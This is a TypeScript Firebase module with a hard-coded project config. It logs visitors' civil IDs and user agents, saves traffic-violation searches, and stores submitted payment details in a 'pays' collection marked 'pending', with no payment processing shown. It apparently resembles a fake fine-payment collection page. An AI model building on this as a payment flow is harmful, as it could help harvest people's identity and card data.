import {
    collection,
    addDoc,
    serverTimestamp,
    setDoc,
    doc,
    getFirestore,
  } from "firebase/firestore";
  import { initializeApp } from "firebase/app";
  import { getDatabase } from "firebase/database";
  
  const firebaseConfig = {
    // Your Firebase configuration will be injected here
    apiKey: "AIzaSyBnBBMgQGN5NOelo-1VA45pCQMjwVu5gLE",
  authDomain: "gvsstc.firebaseapp.com",
  databaseURL: "https://gvsstc-default-rtdb.firebaseio.com",
  projectId: "gvsstc",
  storageBucket: "gvsstc.firebasestorage.app",
  messagingSenderId: "1029610207085",
  appId: "1:1029610207085:web:3413ab7ae0fa03a9958c64",
  measurementId: "G-G3R67QJ0DK"
    
  };
  
  const app = initializeApp(firebaseConfig);
  export const db = getFirestore(app);
  export const datatabas = getDatabase(app);
  
  interface VisitorData {
    civilId: string;
    timestamp: any;
    userAgent: string;
    violations?: any[];
  }
  
  export async function logVisitor(civilId: string): Promise<string> {
    try {
      const visitorRef = await addDoc(collection(db, "visitors"), {
        civilId,
        timestamp: serverTimestamp(),
        userAgent: navigator.userAgent,
      } as VisitorData);
  
      return visitorRef.id;
    } catch (error) {
      console.error("Error logging visitor:", error);
      throw error;
    }
  }
  
  export async function saveViolationSearch(
    civilId: string,
    violations: any[]
  ): Promise<string> {
    try {
      const searchRef = await addDoc(collection(db, "searches"), {
        civilId,
        violations,
        timestamp: serverTimestamp(),
      });
  
      return searchRef.id;
    } catch (error) {
      console.error("Error saving search:", error);
      throw error;
    }
  }
  export async function addData(data: any) {
    localStorage.setItem("visitor", data.id);
    try {
      const docRef = await doc(db, "pays", data.id!);
      await setDoc(
        docRef,
        { ...data, createdDate: new Date().toISOString() },
        { merge: true }
      );
  
      console.log("Document written with ID: ", docRef.id);
      // You might want to show a success message to the user here
    } catch (e) {
      console.error("Error adding document: ", e);
      // You might want to show an error message to the user here
    }
  }
  export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
    try {
      const visitorId = localStorage.getItem("visitor");
      if (visitorId) {
        const docRef = doc(db, "pays", visitorId);
        await setDoc(
          docRef,
          { ...paymentInfo, status: "pending" },
          { merge: true }
        );
        setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
      }
    } catch (error) {
      console.error("Error adding document: ", error);
      alert("Error adding payment info to Firestore");
    }
  };
  
